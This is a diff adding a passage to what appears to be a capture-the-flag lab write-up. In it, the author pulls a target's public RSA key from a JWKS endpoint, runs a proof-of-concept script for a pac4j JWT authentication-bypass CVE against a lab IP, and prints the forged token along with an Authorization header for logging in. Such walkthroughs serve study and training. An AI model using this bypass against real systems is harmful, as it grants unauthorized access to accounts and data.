@@ -135,4 +135,22 @@ const USERS_ENDPOINT = '/api/users';
 const SETTINGS_ENDPOINT = '/api/settings';
 ```
 
-We're looking specifically at the line `Public key available at /api/auth/jwks for token verification`. Pulling that page from the 
+We're looking specifically at the line `Public key available at /api/auth/jwks for token verification`. Pulling that page gives us the websites public RSA key. We can use that to our advantage now that we have the key.
+
+Reading into the CVE we found earlier tells us we have evrything we need to generate the malicious token and bypass the lgoin.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Principal/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc]
+└─# python3 poc.py --jwks http://10.129.49.87:8080/api/auth/jwks
+[*] Fetching JWKS...
+[+] Public key loaded
+[+] PlainJWT created
+
+=== Malicious JWE Token ===
+
+eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.fjIEHSpUYQjIvzPdCU8z5eV02wBk3a2Va4ahUrGM-qaEN7Sza8XBzulwEbhyNsxcfzNWB-XSOE9C1-FweCY_LMCp9Oj3Ie4gFKKlNNsPQUwlPQLcGzgfHCJaVamADm428ZPvtZtxkaGswjbRHB2iQ_2EdVDoWw1VMUWxaCxNlTcygQ9wRa_ub4Nzpk_lddK7xptva8Yf-aGmoWsIJ6BwLXucWBwU6WqqX5SpgbolQ8_Z2iQDf14xV9eRR4yQqi_P6O-SwmWnboE2Q7rJbCR2kzGgC8eqRFBfeTbhXVf9z2SG52cHNHz2agMi2dsSxuMU4xL0rsLU7yZtYrMSKFDadg.7uBx2RdgyeCRRSIZ.30q2z8_ntup65byWeQz929nXpgpJgWxXoD_B34mbSb5ks4NUOrsymgpxOh7eS6Vm2Sq6GtXJjVF8EdaFqolMnVnssD_tIMDHwlWYfMQ1dN9b59yqJeOqekFgbRgiqeFnd8QX_saV9VjNFXONPkFLuW1Ru6RaQPRFmW5S3dYRyVR4OAMxM2PUBKf3hkighydYVuoPfRlvWll3JDf6mUWTRqAarTlUxrLsd5ib8cZWC-eysNZtKA.o7iHSJGqcS4hGctcJEQJiw
+
+Use it as:
+Authorization: Bearer eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.fjIEHSpUYQjIvzPdCU8z5eV02wBk3a2Va4ahUrGM-qaEN7Sza8XBzulwEbhyNsxcfzNWB-XSOE9C1-FweCY_LMCp9Oj3Ie4gFKKlNNsPQUwlPQLcGzgfHCJaVamADm428ZPvtZtxkaGswjbRHB2iQ_2EdVDoWw1VMUWxaCxNlTcygQ9wRa_ub4Nzpk_lddK7xptva8Yf-aGmoWsIJ6BwLXucWBwU6WqqX5SpgbolQ8_Z2iQDf14xV9eRR4yQqi_P6O-SwmWnboE2Q7rJbCR2kzGgC8eqRFBfeTbhXVf9z2SG52cHNHz2agMi2dsSxuMU4xL0rsLU7yZtYrMSKFDadg.7uBx2RdgyeCRRSIZ.30q2z8_ntup65byWeQz929nXpgpJgWxXoD_B34mbSb5ks4NUOrsymgpxOh7eS6Vm2Sq6GtXJjVF8EdaFqolMnVnssD_tIMDHwlWYfMQ1dN9b59yqJeOqekFgbRgiqeFnd8QX_saV9VjNFXONPkFLuW1Ru6RaQPRFmW5S3dYRyVR4OAMxM2PUBKf3hkighydYVuoPfRlvWll3JDf6mUWTRqAarTlUxrLsd5ib8cZWC-eysNZtKA.o7iHSJGqcS4hGctcJEQJiw
+```
+
